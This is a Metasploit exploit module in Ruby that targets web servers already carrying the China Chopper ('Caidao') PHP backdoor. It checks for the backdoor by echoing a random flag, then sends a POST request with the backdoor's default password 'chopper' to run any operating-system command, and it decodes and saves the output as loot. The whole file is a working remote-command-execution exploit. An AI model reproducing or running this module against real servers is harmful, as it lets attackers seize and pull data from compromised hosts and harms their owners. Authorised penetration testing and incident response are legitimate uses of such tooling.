
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'              => 'Chinese Caidao PHP Backdoor Command Execution',
      'Description'       => %q{
        This module exploits chinese caidao php backdoor which allows
        os command execution.
      },
      'License'           => MSF_LICENSE,
      'Author'            => ['Nixawk'],
      'References'        => [['URL', 'http://www.maicaidao.com']],
      'Privileged'        => false,
      'Payload'           =>
        {
          'Space'         => 2048,
          'DisableNops'   => true
        },
      'Platform'          => 'php',
      'Arch'              => ARCH_PHP,
      'Targets'           =>
        [
          ['chinsese caidao os cmd exec', {}]
        ],
      'DisclosureDate'    => 'Oct 27 2015',
      'DefaultTarget'     => 0))

    register_options(
      [
        OptString.new(
          'TARGETURI', [true, 'The path of backdoor', '/caidao.php']
        ),
        OptString.new(
          'PASSWORD', [true, 'The password of backdoor', 'chopper']
        ),
        OptString.new('CMD', [true, 'The command of os', 'dir'])
      ], self.class)
  end

  def caidao_req(payload)
    l = Rex::Text.rand_text_alpha(16)
    r = Rex::Text.rand_text_alpha(16)
    uri = normalize_uri(target_uri.path)
    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => uri,
      'vars_post' => {
        "#{datastore['PASSWORD']}" => "echo \"#{l}\";#{payload};echo \"#{r}\";"
      }
    })

    if res && res.code == 200 && res.body =~ /#{l}([\s\S]*)#{r}/m
      $1
    end
  end

  def check
    flag = Rex::Text.rand_text_alpha(32)
    payload = "echo \"#{flag}\""
    data = caidao_req(payload)

    if data && data == flag
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    payload = "echo base64_encode(`#{datastore['CMD']}`)"
    data = caidao_req(payload)

    if data && !data.blank?
      data = Rex::Text.decode_base64(data)
      print_good(data)
      path = store_loot("#{datastore['CMD']}",
                        'text/plain',
                        datastore['RHOST'],
                        data,
                        "#{datastore['CMD']}")
      print_good('Save file to ' + path)
    end
  end
end
